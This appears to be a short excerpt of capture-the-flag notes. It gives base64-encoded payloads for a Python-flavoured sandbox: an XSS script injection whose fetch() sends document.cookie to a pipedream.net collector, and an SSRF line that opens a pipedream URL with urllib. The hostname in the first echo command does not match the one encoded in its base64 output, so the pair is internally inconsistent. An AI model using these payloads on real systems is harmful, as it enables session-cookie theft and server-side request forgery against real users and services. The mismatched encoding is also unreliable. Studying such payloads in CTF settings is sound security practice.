
* Base64 encoded version of the payload - XSS to access DOM

```
echo 'import document;op=document.createElement("script");op.innerText="fetch('\''https://enlgh6572dgdt6s.m.pipedream.net/tuctf?cookie='\''+document.cookie);";document.getElementsByTagName("body")[0].appendChild(op);print("done");' | base64 

aW1wb3J0IGRvY3VtZW50O29wPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO29wLmlubmVyVGV4dD0iZmV0Y2goJ2h0dHBzOi8vZW5sZmc2NTdqcmdkdDZzLm0ucGlwZWRyZWFtLm5ldC90dWN0Zj9jb29raWU9Jytkb2N1bWVudC5jb29raWUpOyI7ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImJvZHkiKVswXS5hcHBlbmRDaGlsZChvcCk7cHJpbnQoImRvbmUiKTsK
```

* Base64 encoded version of leveraging lib - ssrf

```
echo 'import urllib.request;url="https://enlfg657jrgdt6s.m.pipedream.net?c=";urllib.request.urlopen(url)' | base64 

aW1wb3J0IHVybGxpYi5yZXF1ZXN0O3VybD0iaHR0cHM6Ly9lbmxmZzY1N2pyZ2R0NnMubS5waXBlZHJlYW0ubmV0P2M9Ijt1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkK
```


